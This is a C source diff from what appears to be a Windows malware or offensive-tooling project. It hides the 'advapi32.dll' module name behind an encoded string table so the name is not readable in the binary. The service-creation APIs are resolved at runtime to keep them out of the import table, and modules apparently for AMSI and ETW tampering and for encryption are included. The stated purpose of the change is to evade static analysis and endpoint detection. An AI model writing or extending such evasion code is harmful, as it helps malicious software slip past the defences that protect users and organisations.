@@ -276,6 +276,16 @@ static fn_open_sc_manager px_open_sc_manager = NULL;
 static fn_create_service px_create_service = NULL;
 static fn_close_service_handle px_close_service_handle = NULL;
 
+/* The advapi32 module name, from the encoded string table.
+ *
+ * A raw literal here would be a readable "advapi32.dll" in the binary
+ * even in the obfuscated arms, and the module name is the one string
+ * that says which library the program is about to resolve.
+ *
+ * It is DEFINED after the string table is included, which is why it is
+ * declared here. */
+static const char *px_cap_advapi32(void);
+
 /* Resolve the API that would otherwise be in the import table.
  *
  * Returns 1 if every one of them resolved. A missing one is not fatal
@@ -283,7 +293,7 @@ static fn_close_service_handle px_close_service_handle = NULL;
  * is what it already does for a build that does not have the library. */
 static int px_advapi_init(void)
 {
-    HMODULE h = LoadLibraryA("advapi32.dll");
+    HMODULE h = LoadLibraryA(px_cap_advapi32());
     int ok = 1;
 
     if (!h)
@@ -386,6 +396,16 @@ static px_size_t px_strlen(const char *s)
  * The order matters: px_obfuscate.c defines the decoder that the others
  * call. */
 #include "px_obfuscate.c"
+
+/* The definition of the helper that was declared earlier: the string
+ * table is only available from here on. */
+static const char *px_cap_advapi32(void)
+{
+    static char buf[16];
+    if (!buf[0])
+        px_obf_decode(PX_SID_ADVAPI32, buf, sizeof(buf));
+    return buf;
+}
 #include "px_amsi.c"
 #include "px_etw.c"
 #include "px_crypt.c"
